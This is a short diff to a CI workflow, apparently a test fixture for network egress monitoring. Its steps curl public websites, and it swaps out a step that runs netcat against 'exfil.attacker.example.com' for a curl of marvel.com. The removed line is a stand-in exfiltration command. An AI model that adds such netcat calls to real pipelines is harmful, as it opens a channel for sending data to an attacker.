@@ -19,8 +19,8 @@ jobs:
       - name: Curl google
         run: "curl -s https://google.com"
 
-      - name: nc exfil.attacker.example.com 80 
-        run: nc exfil.attacker.example.com 80
+      - name: curl marvel.com  
+        run: "curl -s https://marvel.com"
 
       - name: curl mitsubishielectric.com
         if: always()
